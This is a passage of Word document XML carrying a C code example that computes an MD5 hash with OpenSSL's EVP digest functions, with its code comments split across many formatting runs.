        <w:t>HA1, R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>MD160 e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>c.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ck </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>e Open</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>docu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on for de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>s */</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">d = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>VP_ge</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>_d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ges</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>byn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e("MD5");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(!</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>d) {</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="640"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("Unab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>MD5 d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ges</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t\</w:t>
      </w:r>
      <w:r>
        <w:t>n");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="640"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>(1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="220"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1420" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="70"/>
        <w:ind w:left="220" w:right="4436"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>VP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>MD_C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>X_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;m</w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">x); </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>VP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ges</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>_ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;m</w:t>
      </w:r>
      <w:r>
        <w:t>dc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>x,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>d, NU</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>LL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">); </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>VP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ges</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>Upd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>x,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>npu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>, s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>npu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>));</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220" w:right="1599"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">* </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o add</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ore da</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o hash, p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>ce ad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>iti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>VP_D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ges</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>Upda</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">here */ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>VP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ges</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>_ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;m</w:t>
      </w:r>
      <w:r>
        <w:t>dc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>x,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">en); </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>VP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>MD_C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>X_c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>eanup</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;m</w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>x);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>* N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>w ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>sh v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue, ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h of ou</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>wh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ch </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s 128 b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>16 by</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
